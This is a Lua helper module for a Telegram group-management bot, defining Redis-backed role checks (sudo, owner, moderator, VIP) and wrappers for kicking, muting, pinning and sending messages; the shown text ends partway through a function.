
Config = dofile('./Alpha/Config.lua')
AlphaTm = '`MrTmAlpha`'
SUDO = Config.SUDO_ID
UserSudo = '@'..Config.Sudo1
PvUserSudo = '@'..Config.PvSudo1
clr = require 'term.colors' 
Full_Sudo = Config.Full_Sudo
Sisi = 935728510
Sudoid = Config.Sudoid
TD_ID = Config.TD_ID
BotCliId = Config.BotCliId
BotJoiner = Config.BotJoiner
UserJoiner = Config.UserJoiner
Channel = '@'..Config.Channel
LinkSuppoRt = Config.LinkSuppoRt
IDSup = Config.IDSup
JoinToken = Config.JoinToken
json = dofile('./Alpha/JSON.lua')
serpent = dofile('./Alpha/serpent.lua')
lgi = require ('lgi')
notify = lgi.require('Notify')
notify.init ("Telegram updates")
chats = {}
base = dofile('./Alpha/redis.lua')
tdbot = dofile('./Alpha/tdbot.lua')
base:select(Config.RedisIndex)
utf8 = dofile('./Alpha/utf8.lua')
dkjson = dofile('./Alpha/dkjson.lua')
http = require("socket.http")
https = require("ssl.https")
URL = require("socket.url")
offset = 0
minute = 60
hour = 3600
day = 86400
week = 604800
MsgTime = os.time() - 60
Plan1 = 2592000
Plan2 = 7776000
local Bot_Api = 'https://api.telegram.org/bot' .. JoinToken
color = {
black = {"\027[30m", "\027[40m"},
red = {"\027[31m", "\027[41m"},
green = {"\027[32m", "\027[42m"},
yellow = {"\027[33m", "\027[43m"},
blue = {"\027[34m", "\027[44m"},
magenta = {"\027[35m", "\027[45m"},
cyan = {"\027[36m", "\027[46m"},
white = {"\027[37m", "\027[47m"},
default = "\027[00m"
}
----------------------------------------------
function dl_cb(arg, data)
end
local function getParse(parse_mode)
local P = {}
if parse_mode then
local mode = parse_mode:lower()
if mode == 'markdown' or mode == 'md' then
P._ = 'textParseModeMarkdown'
elseif mode == 'html' then
P._ = 'textParseModeHTML'
end
end
return P
end

function is_Helper(msg)
local var = false
if msg.sender_user_id == BotJoiner then
var = true
end
return var
end
function is_Helper1(user)
local var = false
if user == BotJoiner then
var = true
end
return var
end
--------**Sudo**--------
function is_Sudo(msg)
local var = false
for v,user in pairs(SUDO) do
if user == (msg.sender_user_id) then
var = true
end
end
if base:sismember(TD_ID..'SUDO',msg.sender_user_id) then
var = true
end
if Sudo == tonumber(msg.sender_user_id) then
var = true
end
return var
end
--------**FullSudo**--------
function is_FullSudo(msg)
local var = false
for v,user in pairs(Full_Sudo) do
if user == msg.sender_user_id then
var = true
end
end
return var
end
function do_notify (user, msg)
local n = notify.Notification.new(user, msg)
n:show ()
end
--------**GlobalyBan**--------
function is_GlobalyBan(user_id)
local var = false
local hash = TD_ID..'GlobalyBanned:'
local gbanned = base:sismember(hash,user_id)
if gbanned then
var = true
end
return var
end
------------------------
function is_GlobalyMute(user_id)
local var = false
local hash = TD_ID..'AGTMute:'
local gbanned = base:sismember(hash,user_id)
if gbanned then
var = true
end
return var
end
--------**Owner**--------
function is_Owner(msg)
local hash = base:sismember(TD_ID..'OwnerList:'..msg.chat_id,msg.sender_user_id)
if hash or is_Sudo(msg) then
return true
else
return false
end
end
function is_Nazem(msg)
local hash = base:sismember(TD_ID..'NazemList:'..msg.chat_id,msg.sender_user_id)
if hash or is_Sudo(msg) or is_Owner(msg) then
return true
else
return false
end
end
--------**Mod**--------
function is_ModAnony(msg)
local hash = base:sismember(TD_ID..'ModAnony:'..msg.chat_id,msg.sender_user_id)
if hash or is_Sudo(msg) or is_Owner(msg) or is_Nazem(msg) then
return true
else
return false
end
end


function is_Mod(msg)
local hash = base:sismember(TD_ID..'ModList:'..msg.chat_id,msg.sender_user_id)
if hash or is_Sudo(msg) or is_Owner(msg) or is_Nazem(msg) then
return true
else
return false
end
end
function is_ModTest(msg)
local hash = base:sismember(TD_ID..'ModListtest:'..msg.chat_id,msg.sender_user_id)
if hash or is_Sudo(msg) or is_Owner(msg) or is_Nazem(msg) then
return true
else
return false
end
end
---limit Clean mod----
function is_ModPin(msg)
local hash = base:sismember(TD_ID..'ModPinList:'..msg.chat_id,msg.sender_user_id)
if hash or is_Sudo(msg) or is_Owner(msg) or is_Nazem(msg) then
return true
else
return false
end
end
function is_ModLockOptionSticker(msg)
local hash = base:sismember(TD_ID..'ModLockOptionSticker:'..msg.chat_id,msg.sender_user_id)
if hash or is_Sudo(msg) or is_Owner(msg) or is_Nazem(msg) then
return true
else
return false
end
end
function is_ModLockOptionGif(msg)
local hash = base:sismember(TD_ID..'ModLockOptionGif:'..msg.chat_id,msg.sender_user_id)
if hash or is_Sudo(msg) or is_Owner(msg) or is_Nazem(msg) then
return true
else
return false
end
end


function is_ModLockOptionPhoto(msg)
local hash = base:sismember(TD_ID..'ModLockOptionPhoto:'..msg.chat_id,msg.sender_user_id)
if hash or is_Sudo(msg) or is_Owner(msg) or is_Nazem(msg) then
return true
else
return false
end
end
function is_ModLockOptionForwarded(msg)
local hash = base:sismember(TD_ID..'ModLockOptionForwarded:'..msg.chat_id,msg.sender_user_id)
if hash or is_Sudo(msg) or is_Owner(msg) or is_Nazem(msg) then
return true
else
return false
end
end
function is_ModLockOptionNazar(msg)
local hash = base:sismember(TD_ID..'ModLockOptionNazar:'..msg.chat_id,msg.sender_user_id)
if hash or is_Sudo(msg) or is_Owner(msg) or is_Nazem(msg) then
return true
else
return false
end
end

function is_ModLockOptionFile(msg)
local hash = base:sismember(TD_ID..'ModLockOptionFile:'..msg.chat_id,msg.sender_user_id)
if hash or is_Sudo(msg) or is_Owner(msg) or is_Nazem(msg) then
return true
else
return false
end
end

function is_ModLockOptionVoice(msg)
local hash = base:sismember(TD_ID..'ModLockOptionVoice:'..msg.chat_id,msg.sender_user_id)
if hash or is_Sudo(msg) or is_Owner(msg) or is_Nazem(msg) then
return true
else
return false
end
end

function is_ModLockOptionLink(msg)
local hash = base:sismember(TD_ID..'ModLockOptionLink:'..msg.chat_id,msg.sender_user_id)
if hash or is_Sudo(msg) or is_Owner(msg) or is_Nazem(msg) then
return true
else
return false
end
end

function is_ModLockOptionBot(msg)
local hash = base:sismember(TD_ID..'ModLockOptionBot:'..msg.chat_id,msg.sender_user_id)
if hash or is_Sudo(msg) or is_Owner(msg) or is_Nazem(msg) then
return true
else
return false
end
end
-------------------------
function is_ModClean(msg)
local hash = base:sismember(TD_ID..'ModCleanList:'..msg.chat_id,msg.sender_user_id)
if hash or is_Sudo(msg) or is_Owner(msg) or is_Nazem(msg) then
return true
else
return false
end
end
---limit BAN mod----
function  is_ModBan(msg)
local hash = base:sismember(TD_ID..'ModBanList:'..msg.chat_id,msg.sender_user_id)
if hash or is_Sudo(msg) or is_Owner(msg) or is_Nazem(msg) then
return true
else
return false
end
end
---------limit mute list------------
function is_ModMute(msg)
local hash = base:sismember(TD_ID..'ModMuteList:'..msg.chat_id,msg.sender_user_id)
if hash or is_Sudo(msg) or is_Owner(msg) or is_Nazem(msg) then
return true
else
return false
end
end

---------limit warn list------------
function is_ModWarn(msg)
local hash = base:sismember(TD_ID..'ModWarnList:'..msg.chat_id,msg.sender_user_id)
if hash or is_Sudo(msg) or is_Owner(msg) or is_Nazem(msg) then
return true
else
return false
end
end
---------limit lock list------------
function is_ModLock(msg)
local hash = base:sismember(TD_ID..'ModLockList:'..msg.chat_id,msg.sender_user_id)
if hash or is_Sudo(msg) or is_Owner(msg) or is_Nazem(msg) then
return true
else
return false
end
end
---------limit panel list------------
function is_ModPanelCmd(msg)
local hash = base:sismember(TD_ID..'ModpanelList:'..msg.chat_id,msg.sender_user_id)
if hash or is_Sudo(msg) or is_Owner(msg) or is_Nazem(msg) then
return true
else
return false
end
end

function is_ModVipCmd(msg)
local hash = base:sismember(TD_ID..'ModVipList:'..msg.chat_id,msg.sender_user_id)
if hash or is_Sudo(msg) or is_Owner(msg) or is_Nazem(msg) then
return true
else
return false
end
end
---------limit lock All------------
--------**Vip**--------
function is_Vip(msg)
local hash = base:sismember(TD_ID..'Vip:'..msg.chat_id,msg.sender_user_id)
if hash or is_Mod(msg) then return true
else
return false
end
end
function is_VipJoin(msg)
local hash = base:sismember(TD_ID..'VipJoin:'..msg.chat_id,msg.sender_user_id)
if hash or is_Mod(msg) then return true
else
return false
end
end
--------**BanUser**--------
function is_Banned(chat_id,user_id)
local hash = base:sismember(TD_ID..'BanUser:'..chat_id,user_id)
if hash then
return true
else
return false
end
end
--------**VipUser**--------
function VipUser(msg,user_id)
user_id = user_id or 00
local Mod = base:sismember(TD_ID..'ModList:'..msg.chat_id,user_id)
local Owner = base:sismember(TD_ID..'OwnerList:'..msg.chat_id,user_id)
local Sudo = base:sismember(TD_ID..'SUDO',user_id)
if Mod or Owner or Sudo then
return true
else
return false
end
end
function OwnUser(msg,user_id)
user_id = user_id or 00
local Owner = base:sismember(TD_ID..'OwnerList:'..msg.chat_id,user_id)
if Owner then
return true
else
return false
end
end

function NazemUser(msg,user_id)
user_id = user_id or 00
local Owner = base:sismember(TD_ID..'NazemList:'..msg.chat_id,user_id)
if Owner then
return true
else
return false
end
end
function ModUserAnony(msg,user_id)
user_id = user_id or 00
local Mod = base:sismember(TD_ID..'ModAnony:'..msg.chat_id,user_id)
if Mod then
return true
else
return false
end
end
function ModUser(msg,user_id)
user_id = user_id or 00
local Mod = base:sismember(TD_ID..'ModList:'..msg.chat_id,user_id)
if Mod then
return true
else
return false
end
end
function ModUserTest(msg,user_id)
user_id = user_id or 00
local Mod = base:sismember(TD_ID..'ModListtest:'..msg.chat_id,user_id)
if Mod then
return true
else
return false
end
end
--------------------------
function SudUser(msg,user_id)
user_id = user_id or 00
local Sudo = base:sismember(TD_ID..'SUDO',user_id)
if Sudo then
return true
else
return false
end
end
--------**filter**--------
function is_filter(msg,value)
local list = base:smembers(TD_ID..'Filters:'..msg.chat_id)
var = false
for i=1, #list do
if base:sismember(TD_ID..'Gp2:'..msg.chat_id,'FilterSen') then
mrr619 = value:match(list[i])
else
mrr619 = value:match(' '..list[i]..' ') or value:match('^'..list[i]..' ') or value:match(' '..list[i]..'$') or value:match('^'..list[i]..'$')
end
if mrr619 then
var = true
end
end
return var
end
--------**MuteUser**--------
function is_MuteUser(chat_id,user_id)
local hash =  base:sismember(TD_ID..'MuteUser:'..chat_id,user_id)
if hash then
return true
else
return false
end
end
--------**ec_name**--------
function ec_name(name)
Ramin = name
if Ramin then
if Ramin:match('_') then
Ramin = Ramin:gsub('_','')
end
if Ramin:match('*') then
Ramin = Ramin:gsub('*','')
end
if Ramin:match('`') then
Ramin = Ramin:gsub('`','')
end
return Ramin
end
end
--------**check_markdown**--------
function check_markdown(text)
str = text
if str:match('_') then
output = str:gsub('_',[[\_]])
elseif str:match('*') then
output = str:gsub('*','\\*')
elseif str:match('`') then
output = str:gsub('`','\\`')
else
output = str
end
return output
end
---------**Sleep & Split**--------
local function sleep(n)
os.execute("sleep "..n)
end
function string:split(sep)
local sep, fields = sep or ":", {}
local pattern = string.format("([^%s]+)", sep)
self:gsub(pattern, function(c) fields[#fields+1] = c end)
return fields
end
--------**sendChatAction**--------
function sendChatAction(chatid, act, uploadprogress)
assert (tdbot_function ({
_ = 'sendChatAction',
chat_id = chatid,
action = {
_ = 'chatAction' .. act,
progress = uploadprogress
},
}, dl_cb, nil))
end
function msg_valid(msg)
if msg.date and msg.date < os.time() - 60 then
print('\027[» OLD MESSAGE « \027[00m')
return false
end
return true
end
---------**GetChatId**--------
local function getChatId(chat_id)
local chat = {}
local chat_id = tostring(chat_id)
if chat_id:match('^-100') then
local channel_id = chat_id:gsub('-100', '')
chat = {id = channel_id, type = 'channel'}
else
local group_id = chat_id:gsub('-', '')
chat = {id = group_id, type = 'group'}
end
return chat
end
local function getMe(cb)
assert (tdbot_function ({
_ = "getMe",
}, cb, nil))
end
---------**Pin & UnPin**---------
function Pin(channelid,messageid,disablenotification)
assert (tdbot_function ({
_ = "pinChannelMessage",
channel_id = getChatId(channelid).id,
message_id = messageid,
disable_notification = disablenotification
}, dl_cb, nil))
end
function Unpin(channelid)
assert (tdbot_function ({
_ = 'unpinChannelMessage',
channel_id = getChatId(channelid).id
}, dl_cb, nil))
end
---------**KickUser**---------
function KickUser(chat_id,user_id)
local Rep = Bot_Api.. '/kickChatMember?chat_id=' .. chat_id .. '&user_id=' .. user_id
return https.request(Rep)
end
function KickUsercli(chat_id, user_id)
tdbot_function ({
_ = "changeChatMemberStatus",
chat_id = chat_id,
user_id = user_id,
status = {
_ = "chatMemberStatusBanned"
},
}, dl_cb, nil)
end
---------**reportChannelSpam**---------
function reportChannelSpam(channelid, userid, messageids)
assert (tdbot_function ({
_ = 'reportChannelSpam',
channel_id = getChatId(channelid).id,
user_id = userid,
message_ids = getVector(messageids)
}, callback or dl_cb, data))
end
---------**GetFile**--------
function getFile(fileid,cb)
assert (tdbot_function ({
_ = 'getFile',
file_id = fileid
}, cb, nil))
end
---------**Left**----------
function Left(chat_id, user_id, s)
assert (tdbot_function ({
_ = "changeChatMemberStatus",
chat_id = chat_id,
user_id = user_id,
status = {
_ = "chatMemberStatus" ..s
},
}, dl_cb, nil))
end
function Leave_api(chat_id)
local Rep = Bot_Api.. '/LeaveChat?chat_id=' .. chat_id
return https.request(Rep)
end
---------**ChangeDes**----------
function changeDes(Guard,Diamond)
assert (tdbot_function ({
_ = 'changeChannelDescription',
channel_id = getChatId(Guard).id,
description = Diamond
}, dl_cb, nil))
end
--------**ChangeChatTitle**---------
function changeChatTitle(chat_id,title)
assert (tdbot_function ({
_ = "changeChatTitle",
chat_id = chat_id,
title = title
}, dl_cb, nil))
end

function deleteProfilePhoto(profilephotoid)
assert (tdbot_function ({
_ = 'deleteProfilePhoto',
profile_photo_id = profilephotoid
},dl_cb, nil))
end

function changeName(firstname)
assert (tdbot_function ({
_ = 'changeName',
first_name = tostring(firstname),
last_name = ''
},dl_cb, nil))
end
---------**Change bot Ab**----------
function changeAbout(abo)
assert (tdbot_function ({
_ = 'changeAbout',
about = tostring(abo)
},dl_cb, nil))
end

function changeUsername(uname)
assert (tdbot_function ({
_ = 'changeUsername',
username = tostring(uname)
},dl_cb, nil))
end
---------**Mute**----------
function UnRes(chat_id, user_id)
local chat_member_status = {}
if Restricted == 'Restricted' then
chat_member_status = {
is_member = 1,
restricted_until_date = 1,
can_send_messages = 1,
can_send_media_messages = 1,
can_send_other_messages = 1,
can_add_web_page_previews = 1
}

chat_member_status._ = 'chatMemberStatusRestricted'

assert (tdbot_function ({
_ = 'changeChatMemberStatus',
chat_id = chat_id,
user_id = user_id,
status = chat_member_status
}, dl_cb, nil))
end
end
function MuteUser(chat_id, user_id, right)
local chat_member_status = {}
if Restricted == 'Restricted' then
chat_member_status = {
is_member = 0,
restricted_until_date = right or 0,
can_send_messages = 0,
can_send_media_messages = 0,
can_send_other_messages = 0,
can_add_web_page_previews = 0
}

chat_member_status._ = 'chatMemberStatusRestricted'

assert (tdbot_function ({
_ = 'changeChatMemberStatus',
chat_id = chat_id,
user_id = user_id,
status = chat_member_status
}, dl_cb, nil))
end
end

function muteres(chat_id, user_id, Restricted, right)
  local chat_member_status = {}
  if Restricted == 'Restricted' then
    chat_member_status = {
      is_member = right[1] or 1,
      restricted_until_date = right[2] or 0,
      can_send_messages = right[3] or 1,
      can_send_media_messages = right[4] or 1,
      can_send_other_messages = right[5] or 1,
      can_add_web_page_previews = right[6] or 1
    }
    chat_member_status._ = 'chatMemberStatus' .. Restricted
    assert (tdbot_function ({_ = 'changeChatMemberStatus',chat_id = chat_id,user_id = user_id,status = chat_member_status}, dl_cb, nil))
  end
end

function MuteUserLink(chat_id,user_id,time)
local Rep = Bot_Api.. '/restrictChatMember?chat_id=' .. chat_id .. '&user_id=' .. user_id..'&can_post_messages=false&until_date='..time
return https.request(Rep)
end
function UnResLink(chat_id,user_id)
local Rep = Bot_Api.. '/restrictChatMember?chat_id=' .. chat_id .. '&user_id=' .. user_id..'&can_post_messages=true&can_add_web_page_previews=true&can_send_other_messages=true&can_send_media_messages=true'
return https.request(Rep)
end
function promoteToAdmin(chat_id, user_id)
tdbot_function ({
_ = "changeChatMemberStatus",
chat_id = chat_id,
user_id = user_id,
status = {
_ = "chatMemberStatusAdministrator"
},
}, dl_cb, nil)
end
function resolve_username(username,cb)
tdbot_function ({
_ = "searchPublicChat",
username = username
}, cb, nil)
end
function cleanmsgs(chatid, frommessageid, off, lim, onlylocal, callback, data)
assert (tdbot_function ({
_ = 'getChatHistory',
chat_id = chatid,
from_message_id = frommessageid,
offset = off,
limit = lim,
only_local = onlylocal
}, callback or dl_cb, data))
end
function getChatHistory(chat_id, from_message_id, offset, limit,cb)
tdbot_function ({
_ = "getChatHistory",
chat_id = chat_id,
from_message_id = from_message_id,
offset = offset,
limit = limit
}, cb, nil)
end
function deleteMessagesFromUser(chat_id, user_id)
tdbot_function ({
_ = "deleteMessagesFromUser",
chat_id = chat_id,
user_id = user_id
}, dl_cb, nil)
end
local function getMessage(chat_id, message_id,cb)
tdbot_function ({
_ = "getMessage",
chat_id = chat_id,
message_id = message_id
}, cb, nil)
end
function GetChat(chat_id,cb)
assert (tdbot_function ({
_ = 'getChat',
chat_id = chat_id
}, cb, nil))
end
function sendInline(chat_id, replytomessageid, disablenotification, frombackground, queryid, result_id)
assert (tdbot_function ({
_ = 'sendInlineQueryResultMessage',
chat_id = chat_id,
reply_to_message_id = replytomessageid,
disable_notification = disablenotification,
from_background = frombackground,
query_id = queryid,
result_id = tostring(result_id)
}, dl_cb,nil))
end

function editt(chat_id, message_id, text,parse)
assert (tdbot_function ({
_ = 'editMessageText',chat_id = chat_id,
message_id = message_id,
reply_markup = nil,
input_message_content = {
_ = 'inputMessageText',
text = text,
disable_web_page_preview = 0,
clear_draft = 0,
entities = {},
parse_mode = getParse(parse)
},
}, dl_cb,nil))
end
function Admin(chat_id, user_id, Administrator, right)
local chat_member_status = {}
if Administrator == 'Administrator' then
chat_member_status = {
can_be_edited = right and right[1] or 1,
can_change_info = right and right[2] or 1,
can_post_messages = right and right[3] or 1,
can_edit_messages = right and right[4] or 1,
can_delete_messages = right and right[5] or 1,
can_invite_users = right and right[6] or 1,
can_restrict_members = right and right[7] or 1,
can_pin_messages = right and right[8] or 1,
can_promote_members = right and right[9] or 1
}
chat_member_status._ = 'chatMemberStatus' .. Administrator
assert (tdbot_function ({_ = 'changeChatMemberStatus',chat_id = chat_id,user_id = user_id,status = chat_member_status}, dl_cb, nil))
end
end
function editMessageCaption(chat_id, message_id,reply_markup,capt,callback,data)
assert (tdbot_function ({
_ = 'editMessageCaption',
chat_id = chatid,
message_id = messageid,
reply_markup = replymarkup,
caption = tostring(capt)
}, callback or dl_cb, data))
end




function getTextEntities(text, callback, data)
assert (tdbot_function ({
_ = 'getTextEntities',
text = tostring(text)
}, callback or dl_cb, data))
end
function openChat(chatid)
assert (tdbot_function ({
_ = 'openChat',
chat_id = chatid
}, dl_cb, nil))
end
function get(bot_user_id, chat_id, latitude, longitude, query,offset, cb)
assert (tdbot_function ({
_ = 'getInlineQueryResults',
bot_user_id = bot_user_id,
chat_id = chat_id,
user_location = {
_ = 'location',
latitude = latitude,
longitude = longitude
},
query = tostring(query),
offset = tostring(off)
}, cb, nil))
end
function sendBotStartMessage(bot_user_id, chat_id, parameter)
assert (tdbot_function ({_ = 'sendBotStartMessage',bot_user_id = bot_user_id,chat_id = chat_id,parameter = tostring(parameter)},dl_cb,nil))
end

function  viewMessages(chat_id, message_ids)
tdbot_function ({
_ = "viewMessages",
chat_id = chat_id,
message_ids = message_ids
}, dl_cb, nil)
end
local function getInputFile(file, conversion_str, expectedsize)
local input = tostring(file)
local infile = {}

if (conversion_str and expectedsize) then
infile = {
_ = 'inputFileGenerated',
original_path = tostring(file),
conversion = tostring(conversion_str),
expected_size = expectedsize
}
else
if input:match('/') then
infile = {_ = 'inputFileLocal', path = file}
elseif input:match('^%d+$') then
infile = {_ = 'inputFileId', id = file}
else
infile = {_ = 'inputFilePersistentId', persistent_id = file}
end
end

return infile
end
function setProfilePhoto(photo_path)
assert (tdbot_function ({
_ = 'setProfilePhoto',
photo = getInputFile(photo_path)
}, callback or dl_cb, data))
end

local function getVector(str)
  local v = {}
  local i = 1

  for k in string.gmatch(str, '(%d%d%d+)') do
    v[i] = '[' .. i-1 .. ']="' .. k .. '"'
    i = i+1
  end
  v = table.concat(v, ',')
  return load('return {' .. v .. '}')()
end


function addChatMembers(chatid, userids)
  assert (tdbot_function ({ _ = 'addChatMembers',chat_id = chatid,user_ids = getVector(userids),  }, dl_cb, nil))
end

function GetChannelFull(channelid)
assert (tdbot_function ({
_ = 'getChannelFull',
channel_id = getChatId(channelid).id
}, cb, nil))
end
function load_data(filename)
local f = io.open(filename)
if not f then
return {}
end
local s = f:read('*all')
f:close()
local data = JSON.decode(s)
return data
end

function save_data(filename, data)
local s = JSON.encode(data)
local f = io.open(filename, 'w')
f:write(s)
f:close()
end
function changeChatPhoto(chat_id,photo)
assert (tdbot_function ({
_ = 'changeChatPhoto',
chat_id = chat_id,
photo = getInputFile(photo)
}, dl_cb, nil))
end
function setProfilePhoto(photo_path)
assert (tdbot_function ({
_ = 'setProfilePhoto',
photo = getInputFile(photo_path)
}, callback or dl_cb, data))
end
function getFile(fileid)
assert (tdbot_function ({
_ = 'getFile',
file_id = fileid
},dl_cb,nil))
end
function GetWeb(messagetext,cb)
assert (tdbot_function ({
_ = 'getWebPagePreview',
message_text = tostring(messagetext)
}, cb, nil))
end

function DownloadFile(url, fileName)
local respbody = {}
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true }
local response = nil
response = {http.request(options)}
local responsive = response[2]
if responsive ~= 200 then return nil end
local filePath = "./Alpha/data/"..fileName
file = io.open(filePath, "w+")
file:write(table.concat(respbody))
file:close()
return filePath
end
function GetUser(user_id, cb)
assert (tdbot_function ({
_ = 'getUser',
user_id = user_id
}, cb, nil))
end
local function GetUserFull(user_id,cb)
assert (tdbot_function ({
_ = "getUserFull",
user_id = user_id
}, cb, nil))
end
function file_exists(name)
local f = io.open(name,"r")
if f ~= nil then
io.close(f)
return true
else
return false
end
end

function whoami()
local usr = io.popen("whoami"):read('*a')
usr = string.gsub(usr, '^%s+', '')
usr = string.gsub(usr, '%s+$', '')
usr = string.gsub(usr, '[\n\r]+', ' ')
if usr:match("^root$") then
tcpath = '/root/.telegram-bot/AlphaCli'
elseif not usr:match("^root$") then
tcpath = '/home/'..usr..'/.telegram-bot/AlphaCli'
end
end
function kick_user(user_id, chat_id)
if not tonumber(user_id) then return false end
tdbot.changeChatMemberStatus(chat_id, user_id, 'Banned', {0}, dl_cb, nil)
end

function getChannelFull(Guard,Diamond)
assert (tdbot_function ({
_ = 'getChannelFull',
channel_id = getChatId(Guard).id
}, Diamond, nil))
end

function Block(user_id)
assert (tdbot_function ({
_ = 'blockUser',
user_id = user_id
},dl_cb,nil))
end
function Unblock(userid)
assert (tdbot_function ({
_ = 'unblockUser',
user_id = userid
}, dl_cb,nil))
end
function getBlockedUsers(off, lim, callback, data)
assert (tdbot_function ({
_ = 'getBlockedUsers',
offset = off,
limit = lim
}, callback or dl_cb, data))
end
function ForWard(chat_id,from_id,Msg_Id)
local Rep = Bot_Api.. '/forwardMessage?chat_id=' .. chat_id .. '&from_chat_id=' .. from_id ..'&message_id='.. Msg_Id
return https.request(Rep)
end
function ForMsg(chat_id, from_chat_id, message_id,from_background)
assert (tdbot_function ({
_ = "forwardMessages",
chat_id = chat_id,
from_chat_id = from_chat_id,
message_ids = message_id,
disable_notification = 0,
from_background = from_background
}, dl_cb, nil))
end
function getChannelMembers(channelid,mbrfilter,off, limit,cb)
if not limit or limit > 2000000000 then
limit = 2000000000
end
assert (tdbot_function ({
_ = 'getChannelMembers',
channel_id = getChatId(channelid).id,
filter = {
_ = 'channelMembersFilter' .. mbrfilter,
},
offset = off,
limit = limit
}, cb, nil))
end
function download(fileid, priorities)
assert (tdbot_function ({
_ = 'downloadFile',
file_id = fileid,
priority = priorities
}, dl_cb, nil))
end

function exportChatInviteLink(chatid,cb)
assert (tdbot_function ({
_ = 'exportChatInviteLink',
chat_id = chatid
}, cb, nil))
end

function is_supergroup(msg)
chat_id = tostring(msg.chat_id)
if chat_id:match('^-100') then
if not msg.is_post then
return true
end
else
return false
end
end
function importChatInviteLink(invitelink)
assert (tdbot_function ({
_ = 'importChatInviteLink',
invite_link = tostring(invitelink)
},dl_cb, nil))
end
function deleteMessages(chat_id, message_ids)
tdbot_function ({
_= "deleteMessages",
chat_id = chat_id,
message_ids = message_ids -- vector {[0] = id} or {id1, id2, id3, [0] = id}
}, dl_cb, nil)
end
function getChatMember(chatid, userid)
assert (tdbot_function ({
_ = 'getChatMember',
chat_id = chatid,
user_id = userid
}, dl_cb, nil))
end
--------**Send**--------
function send(chat_id,msg,text, parse)
--sendChatAction(chat_id, 'Typing', 100)
assert( tdbot_function ({
_ = "sendMessage",chat_id = chat_id,
reply_to_message_id = msg,
disable_notification = 0,
from_background = 1,
reply_markup = nil,
input_message_content = {
_ = "inputMessageText",text = text,
disable_web_page_preview = 1,
clear_draft = 0,
parse_mode = getParse(parse),
entities = {}
}
}, dl_cb, nil))
if base:sismember(TD_ID..'Gp2:'..chat_id,'delcmd') then
deleteMessages(chat_id,{[0] = msg})
end
end

local function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
assert (tdbot_function ({
_= "sendMessage",
chat_id = chat_id,
reply_to_message_id = reply_to_message_id,
disable_notification = disable_notification,
from_background = from_background,
reply_markup = reply_markup,
input_message_content = {
_ = "inputMessagePhoto",
photo = getInputFile(photo),
added_sticker_file_ids = {},
width = 0,
height = 0,
caption = caption,
},
}, dl_cb, nil))
if base:sismember(TD_ID..'Gp2:'..chat_id,'delcmd') then
deleteMessages(chat_id,{[0] = reply_to_message_id})
end
end

function sendAudio(chat_id, msg_id, audio,title,caption)
assert( tdbot_function ({
_ = "sendMessage",chat_id = chat_id,
reply_to_message_id = msg_id,
disable_notification = 0,
from_background = 1,
reply_markup = nil,
input_message_content = {
_ = 'inputMessageAudio',
audio = getInputFile(audio),
duration = duration or 0,
title = tostring(title) or 0,
caption = tostring(caption)
}
}, dl_cb, nil))
if base:sismember(TD_ID..'Gp2:'..chat_id,'delcmd') then
deleteMessages(chat_id,{[0] = msg_id})
end
end

function sendDocument(chat_id, reply_to_message_id,disable_notification,from_background ,reply_markup,document)
assert (tdbot_function ({
_= "sendMessage",
chat_id = chat_id,
reply_to_message_id = reply_to_message_id,
disable_notification = disable_notification,
from_background = from_background,
reply_markup = reply_markup,
input_message_content = {
_ = 'inputMessageDocument',
document = getInputFile(document),
},
}, dl_cb, nil))
if base:sismember(TD_ID..'Gp2:'..chat_id,'delcmd') then
deleteMessages(chat_id,{[0] = reply_to_message_id})
end
end

function sendVideoNote(chat_id, reply_to_message_id,disable_notification,from_background ,reply_markup,videonote, vnote_thumb, vnote_duration, vnote_length)
assert (tdbot_function ({
_= "sendMessage",
chat_id = chat_id,
reply_to_message_id = reply_to_message_id,
disable_notification = disable_notification,
from_background = from_background,
reply_markup = reply_markup,
input_message_content = {
_ = 'inputMessageVideoNote',
video_note = getInputFile(videonote),
},
}, dl_cb, nil))
if base:sismember(TD_ID..'Gp2:'..chat_id,'delcmd') then
deleteMessages(chat_id,{[0] = reply_to_message_id})
end
end

function sendM(chat_id, user_id, msg_id, text, offset, length)
assert (tdbot_function ({
_ = "sendMessage",
chat_id = chat_id,
reply_to_message_id = msg_id,
disable_notification = 0,
from_background = true,
reply_markup = nil,
input_message_content = {
_ = "inputMessageText",
text = text,
disable_web_page_preview = 1,
clear_draft = false,
entities = {[0] = {
offset =  offset,
length = length,
_ = "textEntity",
type = {user_id = user_id, _ = "textEntityTypeMentionName"}}}
}
}, dl_cb, nil))
if base:sismember(TD_ID..'Gp2:'..chat_id,'delcmd') then
deleteMessages(chat_id,{[0] = msg_id})
end
end
function sendSticker(chat_id, reply_to_message_id, sticker_file)
assert (tdbot_function ({
_= "sendMessage",
chat_id = chat_id,
reply_to_message_id = reply_to_message_id,
disable_notification = 0,
from_background = true,
reply_markup = nil,
input_message_content = {
_ = 'inputMessageSticker',
sticker = getInputFile(sticker_file),
thumb = sticker_thumb, -- inputThumb
width = sticker_width,
height = sticker_height
},
}, dl_cb, nil))
if base:sismember(TD_ID..'Gp2:'..chat_id,'delcmd') then
deleteMessages(chat_id,{[0] = reply_to_message_id})
end
end
function sendGif(chat_id, msg_id, animation_file,Cap)
assert( tdbot_function ({
_ = "sendMessage",chat_id = chat_id,
reply_to_message_id = msg_id,
disable_notification = 0,
from_background = 1,
reply_markup = nil,
input_message_content = {
_ = 'inputMessageAnimation',
animation = getInputFile(animation_file),
caption = tostring(Cap)
}
}, dl_cb, nil))
if base:sismember(TD_ID..'Gp2:'..chat_id,'delcmd') then
deleteMessages(chat_id,{[0] = msg_id})
end
end
function sendContact(chat_id,msg_id,phone,first,last,user_id)
assert( tdbot_function ({
_ = "sendMessage",chat_id = chat_id,
reply_to_message_id = msg_id,
disable_notification = 0,
from_background = 1,
reply_markup = nil,
input_message_content = {
_ = 'inputMessageContact',
contact = {
_ = 'contact',
phone_number = tostring(phone),
first_name = tostring(first),
last_name = tostring(last),
user_id = user_id
}}
}, dl_cb, nil))
end
function Alpha(num)
list={'０','１','２','３','４','５','６','７','８','９'}
out = tonumber(num)
out = tostring(out)
for i=1,10 do
out = string.gsub(out,i-1,list[i])
end
return out
end


-------------

----------------------------------------------
function alarm(sec, callback, data)
assert (tdbot_function ({
_ = 'setAlarm',
seconds = sec
}, callback or dl_cb, data))
end
------function Api_Sender------
function sendApi(chat_id, reply_to_message_id,text,markdown)
local url = Bot_Api .. '/sendMessage?chat_id=' .. chat_id .. '&text=' .. URL.escape(text)
if reply_to_message_id then
url = url .. '&reply_to_message_id=' .. reply_to_message_id
end
